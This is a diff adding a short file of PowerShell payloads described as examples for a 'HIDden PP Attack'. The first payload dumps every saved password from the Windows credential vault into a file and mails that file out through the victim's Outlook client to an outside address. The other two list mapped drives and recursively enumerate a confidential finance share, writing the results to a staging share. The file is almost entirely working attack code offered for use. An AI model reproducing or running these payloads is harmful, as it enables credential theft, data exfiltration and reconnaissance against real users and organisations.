@@ -1,0 +1,28 @@
+Some example payloads to use with the HIDden PP Attack
+
+
+### Send a file using the users Outlook client as an exfil vector
+
+$path="\\path\to\file\to\attach.csv"
+[void]
+[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime] 
+$vault = New-Object Windows.Security.Credentials.PasswordVault 
+$vault.RetrieveAll() | % { $_.RetrievePassword();$_ } > $path
+Add-Type -Assembly 'Microsoft.Office.Interop.Outlook' -PassThru;
+$Outlook = New-Object -ComObject Outlook.Application;
+$Mail = $Outlook.CreateItem(0);
+$Mail.Recipients.Add('youremail@somewhereniceandsecure.com');
+$Mail.Subject='Data Extracted';
+$Mail.Body = 'Wakka wakka bing bong';
+$Mail.Attachments.Add($path)
+$Mail.Send();
+
+
+### List a users mapped drives
+
+Get-WmiObject Win32_MappedLogicalDisk -computer <computername> | select name, providername > \\server1\SharedArea\Public\PPAttack\folderList.txt
+
+### Enumerate Contents of a shared directory
+
+get-childitem "\\servershare\sharedarea\confidential\finance" -recurse | export-csv  \\server1\SharedArea\Public\PPAttack\fileList.csv
+
